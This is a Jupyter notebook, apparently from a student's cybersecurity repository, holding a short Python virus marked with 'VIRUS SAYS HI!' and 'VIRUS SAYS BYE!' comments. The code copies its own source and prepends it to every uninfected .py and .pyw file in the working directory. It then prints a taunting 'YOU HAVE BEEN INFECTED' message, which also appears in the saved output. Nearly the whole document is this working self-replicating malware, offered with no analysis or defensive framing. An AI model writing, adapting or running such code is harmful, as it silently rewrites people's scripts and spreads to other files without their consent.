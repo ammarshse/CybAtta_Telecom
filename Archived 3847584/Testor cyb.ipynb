{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/"
    },
    "executionInfo": {
     "elapsed": 224,
     "status": "ok",
     "timestamp": 1676665916492,
     "user": {
      "displayName": "Ammar Shaheen",
      "userId": "04711336538983043101"
     },
     "user_tz": -60
    },
    "id": "LbIDEc1oXMqv",
    "outputId": "06da7b41-63e5-4c4f-cb95-686470b11d42"
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "YOU HAVE BEEN INFECTED HAHAHA !!!\n"
     ]
    }
   ],
   "source": [
    "# VIRUS SAYS HI!\n",
    "\n",
    "import sys\n",
    "import glob\n",
    "\n",
    "virus_code = []\n",
    "\n",
    "with open(sys.argv[0], 'r') as f:\n",
    "    lines = f.readlines()\n",
    "\n",
    "self_replicating_part = False\n",
    "for line in lines:\n",
    "    if line == \"# VIRUS SAYS HI!\":\n",
    "        self_replicating_part = True\n",
    "    if not self_replicating_part:\n",
    "        virus_code.append(line)\n",
    "    if line == \"# VIRUS SAYS BYE!\\n\":\n",
    "        break\n",
    "\n",
    "python_files = glob.glob('*.py') + glob.glob('*.pyw')\n",
    "\n",
    "for file in python_files:\n",
    "    with open(file, 'r') as f:\n",
    "        file_code = f.readlines()\n",
    "\n",
    "    infected = False\n",
    "\n",
    "    for line in file_code:\n",
    "        if line == \"# VIRUS SAYS HI!\\n\":\n",
    "            infected = True\n",
    "            break\n",
    "\n",
    "    if not infected:\n",
    "        final_code = []\n",
    "        final_code.extend(virus_code)\n",
    "        final_code.extend('\\n')\n",
    "        final_code.extend(file_code)\n",
    "\n",
    "        with open(file, 'w') as f:\n",
    "            f.writelines(final_code)\n",
    "\n",
    "def malicious_code():\n",
    "    print(\"YOU HAVE BEEN INFECTED HAHAHA !!!\")\n",
    "\n",
    "malicious_code()\n",
    "\n",
    "# VIRUS SAYS BYE!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "colab": {
   "authorship_tag": "ABX9TyM2kNLy2d0nESUcDt5DLVl8",
   "provenance": []
  },
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.13"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 1
}
